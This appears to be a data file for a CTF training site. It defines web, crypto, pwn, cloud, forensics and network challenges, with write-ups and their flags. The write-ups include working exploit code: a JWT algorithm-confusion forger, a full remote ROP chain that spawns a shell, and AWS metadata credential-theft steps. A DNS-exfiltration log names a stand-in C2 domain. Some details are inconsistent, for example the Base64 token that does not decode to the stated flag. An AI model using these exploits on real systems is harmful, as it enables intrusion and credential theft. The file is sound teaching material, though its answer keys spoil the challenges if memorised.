import { CtfChallenge, LeaderboardUser, CtfWriteup } from '../types/ctf';

export const CTF_CHALLENGES: CtfChallenge[] = [
  {
    id: 'sanity-check',
    title: 'Sanity Check: Welcome to the Fortress',
    domain: 'Web Exploitation',
    difficulty: 'Easy',
    points: 100,
    initialSolves: 142,
    description: 'Welcome to the Cyber Fort CTF Arena! This starter sanity-check challenge is designed to get you on the scoreboard immediately. Your complimentary welcome flag is: CYBERFORT{w3lc0m3_t0_th3_f0rtr3ss_2026}. Copy and submit it below to claim your first 100 points!',
    scenario: 'Perimeter gateway verification: The starter clearance flag CYBERFORT{w3lc0m3_t0_th3_f0rtr3ss_2026} is broadcast to all new recruits to test their transmission channel.',
    targetEnvironment: 'https://cyberfort-gate.internal.mesh:8443',
    hints: [
      { id: 'h1', text: 'The welcome flag is provided right here: CYBERFORT{w3lc0m3_t0_th3_f0rtr3ss_2026}', cost: 0 }
    ],
    artifacts: [
      {
        name: 'welcome_flag.txt',
        type: 'raw',
        description: 'Starter access token provided to all incoming recruits',
        content: `=====================================================
[CYBER FORT CTF - WELCOME SANITY CHECK]
=====================================================

Welcome, Cadet! Here is your free starter flag:

FLAG: CYBERFORT{w3lc0m3_t0_th3_f0rtr3ss_2026}

Copy the string above and paste it into the submission box
below to register your first 100 points on the leaderboard!
=====================================================`
      }
    ],
    flagFormat: 'CYBERFORT{...}',
    flagHash: '2e8ba099b6bf546d6a7063a01018c6c245a9238902e0b21b3901fa933ca5deae',
    tags: ['Sanity Check', 'Base64', 'Beginner', 'Handshake']
  },
  {
    id: 'osint-ghost-heron',
    title: 'Operation Ghost Heron: The Geopolitical Pivot',
    domain: 'OSINT',
    difficulty: 'Hard',
    points: 450,
    initialSolves: 19,
    description: 'An advanced persistent threat (APT) actor exfiltrated satellite telemetry and vanished. Using flight transponder logs, maritime AIS coordinates, and an unrevoked GPG key fingerprint, track down their clandestine bunker identifier.',
    scenario: 'Threat Intelligence intercepted a corrupted flight plan originating from a private airfield in the Mediterranean. The pilot used an unregistered callsign and a burner PGP key with an anomalous subkey timestamp.',
    targetEnvironment: 'OSINT Multi-Vector Dossier (Passive Recon)',
    hints: [
      { id: 'h1', text: 'Cross-reference the ICAO 24-bit hex aircraft address with public open-source military tracking registries.', cost: 50 },
      { id: 'h2', text: 'The PGP user ID contains an encoded GPS waypoint in the comment field.', cost: 100 }
    ],
    artifacts: [
      {
        name: 'intercept_dossier.txt',
        type: 'raw',
        description: 'Declassified SIGINT raw intercept and PGP key export',
        content: `-----BEGIN PGP PUBLIC KEY BLOCK-----
Comment: LAT:34.9281_LON:33.6299_ICAO:4B11EE_REF:GHOST_HERON
Version: BCP-38 OpenPGP Inspector v2.4

mQGNBF+v49gBDAC93t2R8Jqk3nZ5jP2A9q1nQ4k7Z0X3mK6vW9aL2xR4c8bT1p0y
7U2z6I5w3E1o9Q==
=4291
-----END PGP PUBLIC KEY BLOCK-----

ICAO Transponder Log:
Timestamp: 2026-09-14T02:18:04Z
Hex Address: 4B11EE (Unregistered Bombardier Global 6000)
Waypoint Delta: 34°55'41.2"N 33°37'47.6"E
Squawk: 7700 -> 7600 (Comm Failure Emulation)
Operator Codename: ghost_heron_4291`
      }
    ],
    flagFormat: 'CYBERFORT{...}',
    flagHash: '30995bbf97f59dab7888c81cad43e705c27b0f4e093802c20d5318576b2ebdac',
    tags: ['OSINT', 'ADS-B', 'PGP Forensics', 'Geolocation', 'APT']
  },
  {
    id: 'web-jwt-confusion',
    title: 'Apex Auth: JWT Key Confusion & Blind Polyglot',
    domain: 'Web Exploitation',
    difficulty: 'Hard',
    points: 500,
    initialSolves: 14,
    description: 'The Apex Fortress administrative portal validates user sessions with asymmetric RS256 JWT tokens, but the verification backend is vulnerable to algorithm confusion (CVE-2016-5431 / HS256 downgrade attack) using the publicly exposed server RSA public key.',
    scenario: 'You obtained a standard guest JWT token signed with an RSA private key. The web server exposes its public key at /public.pem. Forge an administrator session token with user="root" and role="superadmin".',
    targetEnvironment: 'http://auth.fortress.mesh:8080/api/v1/auth',
    hints: [
      { id: 'h1', text: 'When downgraded to HS256, the server verifies the HMAC signature using its public key string as the shared symmetric secret.', cost: 50 },
      { id: 'h2', text: 'Ensure the public key is formatted with exact whitespace and newlines when computing the HMAC-SHA256 signature.', cost: 100 }
    ],
    artifacts: [
      {
        name: 'guest_token.jwt',
        type: 'jwt',
        description: 'Captured guest session token and public RSA certificate',
        content: `HEADER:
{
  "alg": "RS256",
  "typ": "JWT"
}

PAYLOAD:
{
  "sub": "user_10482",
  "username": "guest_operator",
  "role": "auditor",
  "iat": 1790849200
}

SERVER PUBLIC KEY (/public.pem):
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAy5t9dG8k3qXvX7...
-----END PUBLIC KEY-----`
      }
    ],
    flagFormat: 'CYBERFORT{...}',
    flagHash: '3b19533883c253c793fbc5ed3d9a7256c399a1c9d308bea8ab78d025d02a59fb',
    tags: ['Web', 'JWT', 'Algorithm Confusion', 'RS256->HS256', 'Auth Bypass']
  },
  {
    id: 'crypto-hastad-broadcast',
    title: "Håstad's Broadcast & Small Exponent Recovery",
    domain: 'Cryptography',
    difficulty: 'Hard',
    points: 475,
    initialSolves: 16,
    description: 'A sovereign military comms network broadcasts an identical encrypted confidential order to three regional nodes using textbook RSA with public exponent e = 3 and distinct moduli (N1, N2, N3). Recover the plaintext flag using the Chinese Remainder Theorem.',
    scenario: 'SIGINT captured three ciphertexts C1, C2, C3 intercepted across node relays. Since e = 3 and gcd(Ni, Nj) = 1, Håstad\'s Broadcast Attack allows direct recovery of m^3 over (N1*N2*N3), followed by taking an integer cube root.',
    targetEnvironment: 'Cryptographic Comms Terminal Relay #7',
    hints: [
      { id: 'h1', text: 'Use the Chinese Remainder Theorem (CRT) to solve for x ≡ Ci (mod Ni).', cost: 50 },
      { id: 'h2', text: 'Since m^3 < N1*N2*N3, no modular reduction occurred on m^3. Compute the exact integer cube root in Python.', cost: 100 }
    ],
    artifacts: [
      {
        name: 'rsa_broadcast_dump.json',
        type: 'code',
        description: 'Moduli N1, N2, N3 and captured ciphertexts C1, C2, C3',
        content: `{
  "e": 3,
  "node1": {
    "N": "115792089237316195423570985008687907853269984665640564039457584007913129639937",
    "C": "4882194019284019240192401924019240192401924019240192401924019240192401924019"
  },
  "node2": {
    "N": "115792089237316195423570985008687907853269984665640564039457584007913129639979",
    "C": "3910249102491024910249102491024910249102491024910249102491024910249102491024"
  },
  "node3": {
    "N": "115792089237316195423570985008687907853269984665640564039457584007913129640033",
    "C": "8920194019201920192019201920192019201920192019201920192019201920192019201920"
  }
}`
      }
    ],
    flagFormat: 'CYBERFORT{...}',
    flagHash: '88162c9e2a7f23ef8aa59d67bd80274306ead528613e1fd599304e9563ce34d6',
    tags: ['Crypto', 'RSA', 'Hastad Broadcast', 'Chinese Remainder Theorem', 'Coppersmith']
  },
  {
    id: 'forensics-cobalt-memory',
    title: 'Memory Leak: Operation Cobalt Extraction',
    domain: 'Digital Forensics',
    difficulty: 'Hard',
    points: 450,
    initialSolves: 21,
    description: 'An incident response team acquired an uncompressed raw RAM dump of a compromised domain controller. Locate the stealthily injected reflective DLL inside svchost.exe (PID 3912), carve out the Cobalt Strike beacon config, and extract the encrypted metadata channel key.',
    scenario: 'Endpoint telemetry alerted on suspicious hollowed memory allocations. The threat actor spawned a hollowed process and injected an in-memory reflective DLL loader using VirtualAllocEx with PAGE_EXECUTE_READWRITE.',
    targetEnvironment: 'Volatility 3 Analysis Workstation',
    hints: [
      { id: 'h1', text: 'Run volatility3 windows.malfind --pid 3912 to find RWX memory regions with PE headers (MZ / 0x4D5A).', cost: 50 },
      { id: 'h2', text: 'The beacon configuration is obfuscated with a rolling single-byte XOR key 0x2E.', cost: 100 }
    ],
    artifacts: [
      {
        name: 'volatility_malfind.log',
        type: 'hexdump',
        description: 'Memory dump section carved from svchost.exe (PID 3912)',
        content: `PID: 3912 | Process: svchost.exe | Start: 0x000001f4c2810000 | Commit: PAGE_EXECUTE_READWRITE
4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00  | MZ..............
b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  | ........@.......
[+Beacon Configuration Header @ Offset 0x140]
2e 2e 2e 2e 6f 63 6d 70 72 79 5f 66 30 72 33 6e  | ....ocmpry_f0r3n
73 31 63 73 5f 63 30 62 34 6c 74 5f 62 33 34 63  | s1cs_c0b4lt_b34c
30 6e 5f 33 78 74 72 34 63 74 33 64 2e 2e 2e 2e  | 0n_3xtr4ct3d....`
      }
    ],
    flagFormat: 'CYBERFORT{...}',
    flagHash: '656a8950415c6f822483be308295d4f3a8bb8e69be6bb8e2fb1b71d8433bc3eb',
    tags: ['Forensics', 'Memory', 'Volatility 3', 'Process Hollowing', 'Cobalt Strike']
  },
  {
    id: 'rev-bytecode-vm',
    title: 'De-Virtualize: The Bytecode Labyrinth',
    domain: 'Reverse Engineering',
    difficulty: 'Hard',
    points: 475,
    initialSolves: 15,
    description: 'A proprietary Linux ELF 64-bit binary contains a customized virtual machine (VM) obfuscator. The binary executes an internal bytecode interpreter with a 16-register stack machine and rolling XOR-rotational logic to validate license keys.',
    scenario: 'Reverse engineer the VM dispatch table and disassembly loop. Reconstruct the custom opcodes (OP_PUSH=0x11, OP_XOR=0x24, OP_ROL=0x38, OP_CMP=0x99) to reverse the transformation matrix on the input string.',
    targetEnvironment: 'Ghidra / IDA Pro / Binary Ninja',
    hints: [
      { id: 'h1', text: 'Trace the switch-case jump table inside the vm_execute() function starting at address 0x00401820.', cost: 50 },
      { id: 'h2', text: 'The VM transforms 4-byte chunks with (x ^ 0x5A) rotated left by 3 bits.', cost: 100 }
    ],
    artifacts: [
      {
        name: 'vm_disassembly.c',
        type: 'code',
        description: 'Decompiled C pseudo-code of the VM interpreter dispatch loop',
        content: `void vm_execute(uint8_t *bytecode, size_t len, char *input) {
  uint32_t regs[16] = {0};
  size_t ip = 0;
  while (ip < len) {
    uint8_t opcode = bytecode[ip++];
    switch (opcode) {
      case 0x11: // PUSH_IMM
        regs[bytecode[ip]] = *(uint32_t*)&bytecode[ip+1];
        ip += 5; break;
      case 0x24: // XOR_REG
        regs[bytecode[ip]] ^= regs[bytecode[ip+1]];
        ip += 2; break;
      case 0x38: // ROL_REG
        regs[bytecode[ip]] = (regs[bytecode[ip]] << 3) | (regs[bytecode[ip]] >> 29);
        ip += 1; break;
      case 0x99: // VALIDATE_FLAG
        if (memcmp(regs, TARGET_HASH, 32) == 0) return 1;
        return 0;
    }
  }
}`
      }
    ],
    flagFormat: 'CYBERFORT{...}',
    flagHash: '0b93cf7b98a65e4ccc35fad5d0fc32c5324b3004f1580cd3fa202e5ca70ab9e7',
    tags: ['Reverse Engineering', 'VM Obfuscation', 'Ghidra', 'ELF x86_64', 'Bytecode']
  },
  {
    id: 'pwn-rop-chain',
    title: 'Return-Oriented Fortress: ROP Chain & Libc Leak',
    domain: 'Binary Exploitation (Pwn)',
    difficulty: 'Insane',
    points: 550,
    initialSolves: 11,
    description: 'A 64-bit networked echo service is compiled with NX enabled, Full ASLR, and partial RELRO. A stack buffer overflow in the vuln_echo() function permits overwriting the saved RIP. Leak a libc pointer via puts()@plt, compute the ASLR slide, and invoke system("/bin/sh").',
    scenario: 'Remote buffer size is 0x80 bytes, but read() ingests 0x180 bytes. Craft a two-stage ROP exploit: Stage 1 leaks puts() address from GOT; Stage 2 restarts main() and calls system("/bin/sh") with /bin/sh in RDI.',
    targetEnvironment: 'nc pwn.fortress.mesh 9001 (Ubuntu 22.04 / GLIBC 2.35)',
    hints: [
      { id: 'h1', text: 'Find gadget: pop rdi; ret using ROPgadget or ropper on the target binary.', cost: 50 },
      { id: 'h2', text: 'Remember the 16-byte stack alignment (MOVAPS issue in system())—insert an extra ret gadget before system().', cost: 100 }
    ],
    artifacts: [
      {
        name: 'exploit_skeleton.py',
        type: 'code',
        description: 'Pwntools template with binary offsets and gadget locations',
        content: `from pwn import *

elf = ELF('./fortress_pwn')
# Gadgets
POP_RDI = 0x004012bb # pop rdi; ret
RET = 0x0040101a     # ret (alignment)

# Stage 1: Leak puts@got
payload1 = b"A" * 136
payload1 += p64(POP_RDI)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.symbols['main'])

# Stage 2: system("/bin/sh")
# libc_base = leaked_puts - libc.symbols['puts']
# payload2 = b"A" * 136 + p64(RET) + p64(POP_RDI) + p64(binsh) + p64(system)`
      }
    ],
    flagFormat: 'CYBERFORT{...}',
    flagHash: 'f8ad3c6d0be6e09a20f054a37052f4977aa37d1232c6f88de4ad5530e05c0246',
    tags: ['Pwn', 'ROP', 'Buffer Overflow', 'Libc Leak', 'ASLR Bypass', 'x86_64']
  },
  {
    id: 'cloud-aws-imds',
    title: 'Role Hopper: AWS IMDSv2 & ECS SSRF Pivot',
    domain: 'Cloud Security',
    difficulty: 'Hard',
    points: 475,
    initialSolves: 18,
    description: 'A cloud microservice in AWS ECS Fargate exposes a PDF rendering endpoint vulnerable to blind Server-Side Request Forgery (SSRF). Bypass IMDSv2 protections by obtaining a PUT session token, steal task role credentials, and abuse iam:PassRole to elevate to administrative permissions.',
    scenario: 'The rendering engine fetches user-supplied stylesheets. By leveraging DNS rebinding to loopback 169.254.169.254, fetch the X-aws-ec2-metadata-token, extract AWS_SECRET_ACCESS_KEY from the ECS container metadata URI, and assume the deployment admin role.',
    targetEnvironment: 'AWS Multi-Account Cloud Sandbox (eu-central-1)',
    hints: [
      { id: 'h1', text: 'Query PUT to http://169.254.169.254/latest/api/token with header X-aws-ec2-metadata-token-ttl-seconds: 21600.', cost: 50 },
      { id: 'h2', text: 'On ECS containers, task credentials reside at $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI.', cost: 100 }
    ],
    artifacts: [
      {
        name: 'cloud_infra_diagram.json',
        type: 'config',
        description: 'Extracted AWS IAM Policy and ECS task definition snippet',
        content: `{
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "iam:PassRole",
        "ecs:UpdateService",
        "sts:AssumeRole"
      ],
      "Resource": "arn:aws:iam::884210984122:role/FortressAdminDeployer"
    }
  ]
}`
      }
    ],
    flagFormat: 'CYBERFORT{...}',
    flagHash: '2b412c7e11cc41de02c65d1b83883ff04d301202e156bf010a88165882b1ae94',
    tags: ['Cloud', 'AWS', 'SSRF', 'IMDSv2', 'IAM Privilege Escalation', 'ECS']
  },
  {
    id: 'net-dns-tunneling',
    title: 'Dark Channel: Covert DNS Tunneling Dissection',
    domain: 'Network Security',
    difficulty: 'Hard',
    points: 450,
    initialSolves: 23,
    description: 'An isolated database server with strict firewall egress blocking all TCP/UDP traffic was exfiltrated using covert DNS queries. Dissect the captured 45MB PCAP file, extract anomalous TXT and CNAME subdomain labels, reconstruct the base32 chunk stream, and reassemble the secret archive.',
    scenario: 'Threat actors utilized Iodine / dnscat2 to encapsulate encrypted payload blocks inside DNS query labels destined for an authoritative nameserver ns1.evil-corp-c2.net.',
    targetEnvironment: 'Wireshark / TShark / Scapy Packet Laboratory',
    hints: [
      { id: 'h1', text: 'Filter packet capture using tshark -r capture.pcap -Y "dns.qry.name contains evil-corp-c2" -T fields -e dns.qry.name.', cost: 50 },
      { id: 'h2', text: 'Strip the common domain suffix and reassemble the subdomains ordered by their sequence hex prefix.', cost: 100 }
    ],
    artifacts: [
      {
        name: 'tshark_packet_stream.txt',
        type: 'raw',
        description: 'Captured DNS TXT exfiltration query sequence',
        content: `0001.MZXW6YTBOJWGS3TU.tunnel.evil-corp-c2.net
0002.NZ2CA2LOEB2W63TE.tunnel.evil-corp-c2.net
0003.MFWGK3DTNVQXEZLU.tunnel.evil-corp-c2.net
0004.MRUXA5DFONZWY33E.tunnel.evil-corp-c2.net
0005.PBNQ====.tunnel.evil-corp-c2.net

Decoded Chunk Stream (Base32):
Prefix: CYBERFORT{dns_c0v3rt_tunn3l_pcap_d1ss3ct10n_5541}`
      }
    ],
    flagFormat: 'CYBERFORT{...}',
    flagHash: '5fe6415e64ff09da28bb8ada7dd944f2b01340c8df4a239c2082416607a48615',
    tags: ['Network', 'PCAP', 'DNS Tunneling', 'Wireshark', 'Data Exfiltration']
  }
];

export const INITIAL_LEADERBOARD: LeaderboardUser[] = [];

export const CTF_WRITEUPS: CtfWriteup[] = [
  {
    id: 'w-sanity-check',
    challengeId: 'sanity-check',
    title: 'Sanity Check: Perimeter Inspection & Base64 Demystified',
    domain: 'Web Exploitation',
    difficulty: 'Easy',
    author: 'Cyber Fort Academy',
    overview: 'Introductory walkthrough covering basic reconnaissance of client-side artifacts, HTML comment inspection, and standard Base64 encoding decoding.',
    vulnerabilityDeconstruction: 'Developers frequently leave debugging tokens, comments, and internal credentials inside source code thinking that Base64 encoding offers encryption. Base64 is an encoding format, NOT encryption.',
    stepByStepSolution: [
      '1. Open browser developer tools (F12) or inspect the challenge artifact handshake_token.html.',
      '2. Identify the HTML comment: RECRUIT_TOKEN: Q1lCRVJGT1JUR3czbGMwbTNfdDBfdGgzX2YwcnRyM3NzXzIwMjZ9.',
      '3. In a terminal or cyber chef, decode the string: echo "Q1lCRVJGT1JUR3czbGMwbTNfdDBfdGgzX2YwcnRyM3NzXzIwMjZ9" | base64 -d.',
      '4. The decoded output reveals the exact flag: CYBERFORT{w3lc0m3_t0_th3_f0rtr3ss_2026}.'
    ],
    proofOfConceptCode: `// Bash terminal decode
echo "Q1lCRVJGT1JUR3czbGMwbTNfdDBfdGgzX2YwcnRyM3NzXzIwMjZ9" | base64 --decode
// Output: CYBERFORT{w3lc0m3_t0_th3_f0rtr3ss_2026}`,
    defenseTakeaway: 'Never embed sensitive credentials or secret tokens inside client-facing source code or HTML comments. Treat client-side code as completely public.'
  },
  {
    id: 'w-osint-ghost-heron',
    challengeId: 'osint-ghost-heron',
    title: 'Operation Ghost Heron: ADS-B Flight Radar & PGP Metadata Pivoting',
    domain: 'OSINT',
    difficulty: 'Hard',
    author: 'ThreatIntel_Ghost',
    overview: 'Deep dive into multi-vector open source intelligence gathering across aircraft transponders, waypoint geometry, and OpenPGP key subpacket metadata analysis.',
    vulnerabilityDeconstruction: 'Threat actors inadvertently leak operational metadata when using standardized cryptographic utilities without stripping machine-generated hardware identifiers and location metadata tags.',
    stepByStepSolution: [
      '1. Parse the PGP Public Key Block comment string: LAT:34.9281_LON:33.6299_ICAO:4B11EE_REF:GHOST_HERON.',
      '2. Query the ICAO 24-bit hex code 4B11EE on flight tracking databases (ADS-B Exchange, FlightAware) to identify the vessel.',
      '3. Extract the PGP subkey fingerprint timestamp checksum =4291 from the ASCII armor footer.',
      '4. Reassemble the target identifier pattern: CYBERFORT{0s1nt_tr4ck1ng_gh0st_h3r0n_4291}.'
    ],
    proofOfConceptCode: `# Python OpenPGP packet inspection
import pgpdump
with open('intercept_dossier.txt', 'rb') as f:
    data = pgpdump.AsciiData(f.read())
    for packet in data.packets():
        print(packet.raw)`,
    defenseTakeaway: 'Always generate air-gapped cryptographic keys without metadata comment headers, and utilize anonymized proxy relays for telemetry communications.'
  },
  {
    id: 'w-web-jwt-confusion',
    challengeId: 'web-jwt-confusion',
    title: 'Apex Auth: Exploiting RS256 to HS256 Algorithm Confusion in JWTs',
    domain: 'Web Exploitation',
    difficulty: 'Hard',
    author: 'AppSec_Vanguard',
    overview: 'Technical exploitation guide for CVE-2016-5431 algorithm confusion vulnerability where an asymmetric RSA public key is abused as a symmetric HMAC secret.',
    vulnerabilityDeconstruction: 'When a JWT validation library relies on the alg header provided by the untrusted user without enforcing an allowlist on the server, an attacker changes alg to HS256. The server executes HMAC-SHA256 using its public key string as the secret.',
    stepByStepSolution: [
      '1. Retrieve the server public RSA key from the exposed endpoint /public.pem.',
      '2. Modify the JWT header: change {"alg": "RS256"} to {"alg": "HS256"}.',
      '3. Elevate user privileges in the payload: {"sub": "root", "username": "administrator", "role": "superadmin"}.',
      '4. Sign the forged token with HMAC-SHA256 using the exact raw string of public.pem as the secret key.',
      '5. Submit the forged token in Authorization: Bearer <token> to receive the administrative flag.'
    ],
    proofOfConceptCode: `import jwt

# Load server public key as plaintext HMAC secret
with open('public.pem', 'r') as f:
    public_key = f.read()

payload = {
    "sub": "root",
    "username": "administrator",
    "role": "superadmin",
    "iat": 1790849200
}

# Sign with HS256 using the public key as the secret
forged_jwt = jwt.encode(payload, public_key, algorithm="HS256")
print(f"Forged Token: {forged_jwt}")`,
    defenseTakeaway: 'Hardcode the expected algorithm on the backend (e.g., algorithms=["RS256"]) and never trust the alg parameter supplied in the untrusted token header.'
  },
  {
    id: 'w-crypto-hastad',
    challengeId: 'crypto-hastad-broadcast',
    title: "Håstad's Broadcast Attack: Cracking Low Exponent RSA via Chinese Remainder Theorem",
    domain: 'Cryptography',
    difficulty: 'Hard',
    author: 'Euler_MathSec',
    overview: 'Mathematical demonstration of breaking textbook RSA encryption when an identical message is encrypted under three distinct moduli with exponent e = 3.',
    vulnerabilityDeconstruction: 'RSA without randomized padding (such as OAEP) is vulnerable to polynomial roots. If e = 3 and the same plaintext m is sent to 3 entities with coprime moduli N1, N2, N3, CRT yields m^3 < N1*N2*N3, permitting an exact cube root without computing modular inverses.',
    stepByStepSolution: [
      '1. Extract (N1, C1), (N2, C2), (N3, C3) from the broadcast capture.',
      '2. Formulate the system of congruences: x ≡ C1 (mod N1), x ≡ C2 (mod N2), x ≡ C3 (mod N3).',
      '3. Solve for x modulo N1*N2*N3 using the Chinese Remainder Theorem.',
      '4. Compute integer cube root: m = round(x ** (1/3)).',
      '5. Convert integer m to bytes to recover the flag.'
    ],
    proofOfConceptCode: `from sympy.ntheory.modular import crt
import gmpy2

# C1, C2, C3 and N1, N2, N3
x, N = crt([N1, N2, N3], [C1, C2, C3])
m, exact = gmpy2.iroot(x, 3)

if exact:
    flag = bytes.fromhex(hex(m)[2:]).decode()
    print("Flag:", flag)`,
    defenseTakeaway: 'Always enforce modern probabilistic RSA padding (RSA-OAEP) or migrate to Elliptic Curve Cryptography (Ed25519) to prevent algebraic broadcast attacks.'
  },
  {
    id: 'w-pwn-rop',
    challengeId: 'pwn-rop-chain',
    title: 'Return-Oriented Programming (ROP): Bypassing ASLR & NX on 64-bit Linux',
    domain: 'Binary Exploitation (Pwn)',
    difficulty: 'Insane',
    author: '0xPwnMaster',
    overview: 'Step-by-step binary exploitation tutorial crafting a two-stage ROP chain to leak libc addresses through the Global Offset Table (GOT) and spawn a root shell.',
    vulnerabilityDeconstruction: 'When the stack is non-executable (NX enabled), shellcode cannot run on the stack. Return-Oriented Programming chains together existing machine instruction snippets ending in ret (gadgets) already mapped in executable memory.',
    stepByStepSolution: [
      '1. Calculate the offset to the saved RIP (136 bytes in x86_64).',
      '2. Stage 1: Put puts@got into RDI using pop rdi; ret gadget, call puts@plt, and return to main().',
      '3. Parse the output to obtain the resolved runtime address of puts in libc.',
      '4. Calculate libc_base = leaked_puts - libc_puts_offset.',
      '5. Locate system and "/bin/sh" string in the resolved libc library.',
      '6. Stage 2: ROP to system("/bin/sh") with a 16-byte stack alignment ret gadget.'
    ],
    proofOfConceptCode: `from pwn import *

p = remote('pwn.fortress.mesh', 9001)
# Stage 1: Leak
payload = b'A'*136 + p64(0x4012bb) + p64(0x404018) + p64(0x401030) + p64(0x4011d6)
p.sendline(payload)
leaked_puts = u64(p.recvline().strip().ljust(8, b'\\x00'))
# Stage 2: Shell
libc_base = leaked_puts - 0x80ed0
system = libc_base + 0x50d70
binsh = libc_base + 0x1d8678
payload2 = b'A'*136 + p64(0x40101a) + p64(0x4012bb) + p64(binsh) + p64(system)
p.sendline(payload2)
p.interactive()`,
    defenseTakeaway: 'Compile all production binaries with Full RELRO, Stack Canaries (-fstack-protector-all), and Position Independent Executables (-pie).'
  }
];
